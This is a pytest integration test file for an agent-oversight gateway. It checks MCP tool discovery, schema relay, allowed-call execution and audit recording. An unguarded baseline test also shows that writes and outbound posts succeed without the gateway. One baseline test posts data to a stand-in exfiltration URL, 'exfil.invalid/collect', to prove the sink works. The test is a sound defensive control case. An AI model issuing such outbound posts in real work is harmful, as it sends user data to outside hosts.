"""Real MCP discovery and invocation through the gateway (AD-02, AD-03)."""

from __future__ import annotations

from pathlib import Path

import pytest

from agent_drift.seed import build_contract
from agent_drift.store import Store

from .harness import decision_of, direct_upstream, gateway_client, result_text

pytestmark = [pytest.mark.integration, pytest.mark.anyio]

EXPECTED_TOOLS = [
    "network.http_post",
    "repo.delete_file",
    "repo.list_files",
    "repo.read_file",
    "repo.write_file",
]


@pytest.fixture
def anyio_backend() -> str:
    """Run the async tests on asyncio."""
    return "asyncio"


@pytest.fixture
def seeded_db(db_path: Path) -> Path:
    """A database with the read-only demo contract registered."""
    store = Store(db_path)
    try:
        store.put_contract(build_contract("readonly"))
    finally:
        store.close()
    return db_path


class TestDiscovery:
    """tools/list must traverse the gateway with schemas intact."""

    async def test_tools_are_discovered_through_the_gateway(self, seeded_db, fixture_state) -> None:
        async with gateway_client(task_id="demo-repo-review", db_path=seeded_db, state=fixture_state) as (
            client,
            _oracle,
        ):
            result = await client.list_tools()
            assert sorted(tool.name for tool in result.tools) == EXPECTED_TOOLS

    async def test_negotiated_protocol_revision_is_the_pinned_one(self, seeded_db, fixture_state) -> None:
        """Decision D-001: we claim 2026-07-28 and verify it on the wire."""
        async with gateway_client(task_id="demo-repo-review", db_path=seeded_db, state=fixture_state) as (
            client,
            _oracle,
        ):
            assert client.protocol_version == "2026-07-28"

    async def test_input_schemas_survive_the_proxy_unmodified(self, seeded_db, fixture_state) -> None:
        """A proxy that mangled schemas would break argument validation downstream."""
        async with direct_upstream(fixture_state) as upstream:
            direct = {tool.name: tool.input_schema for tool in (await upstream.list_tools()).tools}

        async with gateway_client(task_id="demo-repo-review", db_path=seeded_db, state=fixture_state) as (
            client,
            _oracle,
        ):
            proxied = {tool.name: tool.input_schema for tool in (await client.list_tools()).tools}

        assert proxied == direct, "the gateway altered at least one tool's input schema"

    async def test_descriptions_are_relayed(self, seeded_db, fixture_state) -> None:
        async with gateway_client(task_id="demo-repo-review", db_path=seeded_db, state=fixture_state) as (
            client,
            _oracle,
        ):
            tools = {tool.name: tool for tool in (await client.list_tools()).tools}
            assert tools["repo.read_file"].description
            assert "sandbox" in (tools["repo.read_file"].description or "").lower()

    async def test_tool_list_is_not_filtered_by_the_contract(self, seeded_db, fixture_state) -> None:
        """Disallowed tools are still listed, so an attempt to use one is recorded.

        Hiding them would be friendlier and strictly worse for audit: the host would
        never try, and nothing would show what the agent wanted to do.
        """
        async with gateway_client(task_id="demo-repo-review", db_path=seeded_db, state=fixture_state) as (
            client,
            _oracle,
        ):
            names = {tool.name for tool in (await client.list_tools()).tools}
            assert "repo.write_file" in names
            assert "network.http_post" in names


class TestAuthorizedInvocation:
    """An allowed call really reaches the tool and its result is relayed."""

    async def test_allowed_read_executes_once_and_relays_content(self, seeded_db, fixture_state) -> None:
        async with gateway_client(task_id="demo-repo-review", db_path=seeded_db, state=fixture_state) as (
            client,
            oracle,
        ):
            before = oracle.count("repo.read_file")
            result = await client.call_tool("repo.read_file", {"path": "sandbox-repo/README.md"})
            after = oracle.count("repo.read_file")

            assert decision_of(result) == "allow"
            assert after - before == 1, "the upstream tool did not run exactly once"
            assert "Sandbox Repository" in result_text(result)

    async def test_list_files_is_relayed(self, seeded_db, fixture_state) -> None:
        async with gateway_client(task_id="demo-repo-review", db_path=seeded_db, state=fixture_state) as (
            client,
            oracle,
        ):
            result = await client.call_tool("repo.list_files", {"path": "sandbox-repo"})
            assert decision_of(result) == "allow"
            assert "sandbox-repo/README.md" in result_text(result)
            assert oracle.count("repo.list_files") == 1

    async def test_decision_and_execution_are_both_recorded(self, seeded_db, fixture_state) -> None:
        async with gateway_client(task_id="demo-repo-review", db_path=seeded_db, state=fixture_state) as (
            client,
            _oracle,
        ):
            await client.call_tool("repo.read_file", {"path": "sandbox-repo/README.md"})

        store = Store(seeded_db)
        try:
            row = store.conn.execute(
                "SELECT status, upstream_executed, tool_name FROM decisions "
                "JOIN attempts USING (attempt_id) ORDER BY decisions.rowid DESC LIMIT 1"
            ).fetchone()
            assert row["status"] == "allow"
            assert row["upstream_executed"] == 1
            assert row["tool_name"] == "repo.read_file"
        finally:
            store.close()

    async def test_upstream_tool_error_is_relayed_not_masked(self, seeded_db, fixture_state) -> None:
        """A genuine tool failure must reach the agent as a tool error, not a denial."""
        async with gateway_client(task_id="demo-repo-review", db_path=seeded_db, state=fixture_state) as (
            client,
            oracle,
        ):
            result = await client.call_tool("repo.read_file", {"path": "sandbox-repo/does-not-exist.md"})
            assert result.is_error is True
            assert decision_of(result) != "deny", "a missing file must not look like a policy denial"
            assert oracle.count("repo.read_file") == 1, "the tool was reached, as it should be"


class TestUnguardedBaseline:
    """Without the gateway the fixture is not inert: the write simply happens.

    This is the control for every deny-before-execute assertion. If the fixture refused
    writes by itself, the gateway tests would prove nothing.
    """

    async def test_direct_write_succeeds_and_changes_the_file(self, fixture_state) -> None:
        from .harness import Oracle

        oracle = Oracle(state=fixture_state)
        before = oracle.sha256("sandbox-repo/README.md")
        async with direct_upstream(fixture_state) as upstream:
            result = await upstream.call_tool(
                "repo.write_file",
                {"path": "sandbox-repo/README.md", "content": "overwritten by the baseline"},
            )
        assert result.is_error is False
        assert oracle.count("repo.write_file") == 1
        assert oracle.sha256("sandbox-repo/README.md") != before

    async def test_direct_egress_reaches_the_sink(self, fixture_state) -> None:
        from .harness import Oracle

        oracle = Oracle(state=fixture_state)
        async with direct_upstream(fixture_state) as upstream:
            await upstream.call_tool(
                "network.http_post", {"url": "https://exfil.invalid/collect", "body": "x"}
            )
        assert oracle.sink_events() == 1, "the unguarded baseline must actually record an event"
